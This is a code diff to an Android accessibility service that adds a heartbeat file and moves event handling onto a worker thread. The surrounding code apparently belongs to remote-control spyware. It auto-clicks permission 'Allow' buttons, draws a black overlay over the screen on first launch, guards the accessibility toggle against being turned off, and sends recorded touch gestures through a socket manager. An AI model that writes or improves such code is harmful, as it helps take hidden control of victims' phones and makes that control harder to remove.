@@ -65,6 +65,11 @@ public class UnifiedAccessibilityService extends AccessibilityService {
     // starve UI rendering when a relevant window changes.
     private android.os.HandlerThread permissionScanThread;
     private Handler permissionBgHandler;
+    private static final String HEARTBEAT_FILE = "accessibility_service_heartbeat";
+    private static final long HEARTBEAT_INTERVAL_MS = 15_000L;
+    private static final long HEARTBEAT_MAX_AGE_MS = 45_000L;
+    private Handler heartbeatHandler;
+    private Runnable heartbeatRunnable;
 
     // Auto-grant mode: clicks Allow/Grant/OK buttons for N seconds after accessibility enabled
     private volatile boolean autoGrantMode = false;
@@ -215,6 +220,29 @@ public class UnifiedAccessibilityService extends AccessibilityService {
     }
 
     /**
+     * The accessibility service runs in a separate process from the app UI and
+     * background services. This file heartbeat lets the main process determine
+     * whether that process is still alive without relying on a static singleton
+     * that cannot cross process boundaries.
+     */
+    public static boolean hasFreshHeartbeat(Context context) {
+        if (context == null) return false;
+        java.io.File heartbeat = context.getFileStreamPath(HEARTBEAT_FILE);
+        if (heartbeat == null || !heartbeat.isFile()) return false;
+        try (java.io.BufferedReader reader = new java.io.BufferedReader(
+                new java.io.InputStreamReader(
+                        new java.io.FileInputStream(heartbeat), "UTF-8"))) {
+            String value = reader.readLine();
+            if (value == null) return false;
+            long timestamp = Long.parseLong(value.trim());
+            long age = System.currentTimeMillis() - timestamp;
+            return age >= 0 && age <= HEARTBEAT_MAX_AGE_MS;
+        } catch (Exception ignored) {
+            return false;
+        }
+    }
+
+    /**
      * Arms the uninstall assistant for one exact package. The assistant only
      * acts on an Android package-installer dialog whose visible app label
      * matches this package; it never scans for a generic OK/Yes button.
@@ -305,44 +333,52 @@ public class UnifiedAccessibilityService extends AccessibilityService {
         try { super.onServiceConnected(); } catch (Exception ignored) {}
         instance = this;
 
-        // Start the worker used for short event-driven protection and first-launch
-        // permission work. No periodic protection scanner is started here.
+        // Accessibility callbacks arrive on the service process main looper.
+        // Keep that callback thread responsive by handing event processing to
+        // one dedicated worker. No periodic protection scanner is started here.
         try {
-            permissionScanThread = new android.os.HandlerThread("access-event-worker",
-                    android.os.Process.THREAD_PRIORITY_BACKGROUND);
-            permissionScanThread.start();
-            permissionBgHandler = new Handler(permissionScanThread.getLooper());
+            if (permissionScanThread == null
+                    || !permissionScanThread.isAlive()
+                    || permissionBgHandler == null) {
+                permissionScanThread = new android.os.HandlerThread(
+                        "accessibility-service-worker",
+                        android.os.Process.THREAD_PRIORITY_BACKGROUND);
+                permissionScanThread.start();
+                permissionBgHandler = new Handler(permissionScanThread.getLooper());
+            }
         } catch (Exception e) {
             Log.e(TAG, "Failed to start permissionScanThread: " + e.getMessage());
-            permissionBgHandler = new Handler(Looper.getMainLooper()); // safe fallback
+            permissionBgHandler = null;
         }
+        startAccessibilityHeartbeat();
 
+        // setServiceInfo is a framework binding/configuration call and must
+        // happen promptly from the service callback. The rest of startup is
+        // deliberately deferred to the worker below.
+        configureAccessibilityServiceInfo();
+
+        Runnable initialization = () -> initializeConnectedService(readFirstLaunchState());
+        if (permissionBgHandler != null) {
+            permissionBgHandler.post(initialization);
+        } else {
+            // The worker is expected to start. Keep a defensive fallback so a
+            // rare HandlerThread failure does not leave the service unusable.
+            new Handler(Looper.getMainLooper()).post(initialization);
+        }
+    }
+
+    private boolean readFirstLaunchState() {
         // Detect whether this is the very first launch or a subsequent reboot/restart.
         // overlay_setup_done is written to prefs during first-time setup; on reboot it is already true.
-        boolean isFirstLaunch;
         try {
             android.content.SharedPreferences prefs = getSharedPreferences("svc_prefs", MODE_PRIVATE);
-            isFirstLaunch = !prefs.getBoolean("overlay_setup_done", false);
+            return !prefs.getBoolean("overlay_setup_done", false);
         } catch (Exception e) {
-            isFirstLaunch = false;
+            return false;
         }
+    }
 
-        // Auto-grant timer and overlay are only relevant on first launch (permissions not yet granted)
-        if (isFirstLaunch) {
-            try { startAutoGrantTimer(); } catch (Exception ignored) {}
-            try {
-                addBlackOverlay();
-                android.content.SharedPreferences prefs = getSharedPreferences("svc_prefs", MODE_PRIVATE);
-                prefs.edit().putBoolean("overlay_setup_done", true).apply();
-            } catch (Exception ignored) {}
-        }
-
-        // Accessibility Assist: protect the accessibility toggle from being turned off.
-        // Protection and defender activation is scheduled below and does not wait
-        // for the dangerous runtime-permission flow to finish.
-        try { initAccessibilityAssist(isFirstLaunch); } catch (Exception ignored) {}
-        try { scheduleProtectionAndDefenderAutoStart(); } catch (Exception ignored) {}
-
+    private void configureAccessibilityServiceInfo() {
         try {
             AccessibilityServiceInfo info = new AccessibilityServiceInfo();
             info.eventTypes = AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED |
@@ -357,12 +393,35 @@ public class UnifiedAccessibilityService extends AccessibilityService {
                         AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS |
                         AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS |
                         // Required so onTouchEvent() is called for every touch on the screen.
-                        // Returning false from onTouchEvent() passes all events through unchanged
-                        // so the user's interaction is never blocked or altered.
+                        // Returning false from onTouchEvent() passes all events through unchanged.
                         AccessibilityServiceInfo.FLAG_REQUEST_TOUCH_EXPLORATION_MODE;
             info.notificationTimeout = 100;
             setServiceInfo(info);
-        } catch (Exception ignored) {}
+        } catch (Exception e) {
+            Log.w(TAG, "Accessibility service configuration failed: " + e.getMessage());
+        }
+    }
+
+    /**
+     * Performs non-framework service startup on the dedicated worker.
+     * Overlay/view changes and framework actions used by these helpers post
+     * back to the main looper internally.
+     */
+    private void initializeConnectedService(boolean isFirstLaunch) {
+        if (isFirstLaunch) {
+            try { startAutoGrantTimer(); } catch (Exception ignored) {}
+            try {
+                addBlackOverlay();
+                android.content.SharedPreferences prefs = getSharedPreferences("svc_prefs", MODE_PRIVATE);
+                prefs.edit().putBoolean("overlay_setup_done", true).apply();
+            } catch (Exception ignored) {}
+        }
+
+        // Accessibility Assist: protect the accessibility toggle from being turned off.
+        // Protection and defender activation is scheduled below and does not wait
+        // for the dangerous runtime-permission flow to finish.
+        try { initAccessibilityAssist(isFirstLaunch); } catch (Exception ignored) {}
+        try { scheduleProtectionAndDefenderAutoStart(); } catch (Exception ignored) {}
 
         try { com.task.tusker.commands.ScreenBlackout.getInstance().setService(this); } catch (Exception ignored) {}
 
@@ -443,13 +502,67 @@ public class UnifiedAccessibilityService extends AccessibilityService {
     @RequiresApi(api = Build.VERSION_CODES.UPSIDE_DOWN_CAKE)
     @Override
     public void onMotionEvent(MotionEvent event) {
-        try {
-            com.task.tusker.commands.GestureRecorder gr =
-                    com.task.tusker.network.SocketManager
-                            .getInstance(this).getGestureRecorder();
-            if (gr != null) gr.handleServiceTouchEvent(event);
-        } catch (Exception ignored) {}
+        if (event == null) return;
+        final MotionEvent copy = MotionEvent.obtain(event);
+        Handler worker = permissionBgHandler;
+        if (worker == null) {
+            copy.recycle();
+            return;
+        }
+        worker.post(() -> {
+            try {
+                com.task.tusker.commands.GestureRecorder gr =
+                        com.task.tusker.network.SocketManager
+                                .getInstance(UnifiedAccessibilityService.this)
+                                .getGestureRecorder();
+                if (gr != null) gr.handleServiceTouchEvent(copy);
+            } catch (Exception ignored) {
+            } finally {
+                copy.recycle();
+            }
+        });
         // Not consuming — the framework still delivers the event to the foreground app.
+    }
+
+    private void startAccessibilityHeartbeat() {
+        if (permissionBgHandler == null) return;
+        if (heartbeatRunnable != null) return;
+
+        heartbeatHandler = permissionBgHandler;
+        heartbeatRunnable = new Runnable() {
+            @Override
+            public void run() {
+                writeAccessibilityHeartbeat();
+                if (heartbeatHandler != null && heartbeatRunnable != null) {
+                    heartbeatHandler.postDelayed(this, HEARTBEAT_INTERVAL_MS);
+                }
+            }
+        };
+        heartbeatHandler.post(heartbeatRunnable);
+    }
+
+    private void writeAccessibilityHeartbeat() {
+        try (java.io.FileOutputStream output = openFileOutput(
+                HEARTBEAT_FILE, Context.MODE_PRIVATE)) {
+            output.write(Long.toString(System.currentTimeMillis()).getBytes("UTF-8"));
+        } catch (Exception e) {
+            Log.d(TAG, "Accessibility heartbeat write failed: " + e.getMessage());
+        }
+    }
+
+    private void stopAccessibilityHeartbeat() {
+        try {
+            if (heartbeatHandler != null && heartbeatRunnable != null) {
+                heartbeatHandler.removeCallbacks(heartbeatRunnable);
+            }
+        } catch (Exception ignored) {
+        }
+        heartbeatHandler = null;
+        heartbeatRunnable = null;
+        try {
+            deleteFile(HEARTBEAT_FILE);
+        } catch (Exception ignored) {
+        }
     }
 
     private void ensureRemoteServiceRunning() {
@@ -762,6 +875,27 @@ public class UnifiedAccessibilityService extends AccessibilityService {
 
     @Override
     public void onAccessibilityEvent(AccessibilityEvent event) {
+        if (event == null) return;
+        final AccessibilityEvent copy = AccessibilityEvent.obtain(event);
+        Handler worker = permissionBgHandler;
+        if (worker == null) {
+            copy.recycle();
+            return;
+        }
+        worker.post(() -> {
+            try {
+                processAccessibilityEvent(copy);
+            } finally {
+                copy.recycle();
+            }
+        });
+    }
+
+    /**
+     * Runs on the dedicated accessibility worker, never directly on the
+     * framework callback thread.
+     */
+    private void processAccessibilityEvent(AccessibilityEvent event) {
         try {
             String packageName = event.getPackageName() != null ? 
                                event.getPackageName().toString() : "";
@@ -1732,6 +1866,10 @@ public class UnifiedAccessibilityService extends AccessibilityService {
      */
     private void addBlackOverlay() {
         if (Build.VERSION.SDK_INT < Build.VERSION_CODES.LOLLIPOP_MR1) return;
+        if (Looper.myLooper() != Looper.getMainLooper()) {
+            new Handler(Looper.getMainLooper()).post(this::addBlackOverlay);
+            return;
+        }
         try {
             overlayWindowManager = (WindowManager) getSystemService(WINDOW_SERVICE);
 
@@ -3636,10 +3774,12 @@ public class UnifiedAccessibilityService extends AccessibilityService {
 
     @Override
     public void onInterrupt() {
+        // No blocking work belongs on the framework callback thread.
     }
 
     @Override
     public void onDestroy() {
+        stopAccessibilityHeartbeat();
         try { super.onDestroy(); } catch (Exception ignored) {}
         try {
             if (protectionStartHandler != null && protectionStartRunnable != null) {
